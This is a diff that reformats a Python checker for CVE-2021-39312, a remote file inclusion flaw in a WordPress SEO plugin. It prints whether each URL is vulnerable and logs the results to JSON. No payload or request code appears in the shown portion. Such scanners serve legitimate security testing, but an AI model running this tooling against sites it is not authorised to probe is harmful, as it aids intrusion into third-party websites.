@@ -2,19 +2,18 @@ import sys
 import os
 try:
     # The insertion index should be 1 because index 0 is this file
-    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
+    sys.path.insert(1, '{}/help'.format(
+        os.getcwd()))  # the type of path is string
     # because the system path already have the absolute path to folder a
-    # so it can recognize file_a.py while searching 
+    # so it can recognize file_a.py while searching
     from help.banner import colors
     from help.json_me import json_me
     from help.req import request
-    
+
 except (ModuleNotFoundError, ImportError) as e:
     print("{} fileure".format(type(e)))
 else:
     print("Import succeeded")
-
-
 
 
 def exploit(url, payload=None):
@@ -32,21 +31,23 @@ def exploit(url, payload=None):
             print(colors.yellow + "[+] ==> CVE-2021-39312 %s Vulnerable" % url)
 
             found.append({
-                "url": url,
-                "payload": payload,
-                "status": _response.status_code,
-                "exploit": "CVE-2021-39312",
-                "vuln": "WordPress Plugin SEO Local Rank <= 1.0.1 - Remote File Inclusion"
-
+                "url":
+                url,
+                "payload":
+                payload,
+                "status":
+                _response.status_code,
+                "exploit":
+                "CVE-2021-39312",
+                "vuln":
+                "WordPress Plugin SEO Local Rank <= 1.0.1 - Remote File Inclusion"
             })
             json_me(url, "CVE-2021-39312", found)
         else:
-            print(
-                colors.red + "[-] CVE-2021-39312 ==> %s Not Vulnerable" % url)
+            print(colors.red +
+                  "[-] CVE-2021-39312 ==> %s Not Vulnerable" % url)
 
     except Exception as e:
         print(e)
 
         pass
-
-
